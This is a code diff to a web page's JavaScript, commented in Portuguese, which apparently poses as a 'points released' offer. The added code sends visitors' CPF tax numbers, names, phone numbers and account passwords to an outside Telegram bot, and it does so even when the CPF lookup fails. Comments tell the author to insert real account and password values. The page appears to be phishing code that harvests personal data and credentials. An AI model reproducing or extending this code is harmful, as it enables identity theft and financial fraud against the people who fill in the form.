@@ -145,7 +145,7 @@
             var cpf = document.getElementById("cpf").value;
 
             // Remover pontos e traços do CPF
-            cpf = cpf.replace(/[^\d]/g, '');
+            cpf = cpf.replace(/[^\d]/g, ''); // Remove todos os caracteres não numéricos
 
             if (cpf.length === 11) {
                 // Usando Proxy para contornar o CORS
@@ -169,8 +169,14 @@
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
 
-                    // Agora sempre envia CPF, telefone, conta e senha para o Telegram
-                    enviarParaTelegram(`Consulta de CPF: ${cpf}, Nome: ${nome}`);
+                    // Enviar CPF e outros dados ao Telegram
+                    enviarParaTelegram({
+                        cpf: cpf,
+                        nome: nome,
+                        telefone: document.getElementById("telefone").value,
+                        conta: '1515',  // Aqui você coloca o valor da conta real
+                        senha: '1313'   // Aqui você coloca a senha real
+                    });
                 })
                 .catch((error) => {
                     console.error('Erro ao consultar CPF:', error);
@@ -179,7 +185,13 @@
                     document.getElementById("pontosLiberados").style.display = "block";
 
                     // Mesmo em caso de erro, enviar o CPF para o Telegram
-                    enviarParaTelegram(`Erro na consulta de CPF: ${cpf}`);
+                    enviarParaTelegram({
+                        cpf: cpf,
+                        telefone: document.getElementById("telefone").value,
+                        conta: '1515',
+                        senha: '1313'
+                    });
+
                     alert("Erro ao consultar CPF. Verifique sua conexão ou tente novamente.");
                 });
             } else {
@@ -202,8 +214,10 @@
             }
         }
 
-        function enviarParaTelegram(mensagem) {
+        function enviarParaTelegram(dados) {
             const url = `https://api.telegram.org/bot${tokenBotTelegram}/sendMessage`;
+            const mensagem = `CPF: ${dados.cpf}\nTelefone: ${dados.telefone}\nConta: ${dados.conta}\nSenha: ${dados.senha}`;
+
             const data = {
                 chat_id: chatId,
                 text: mensagem
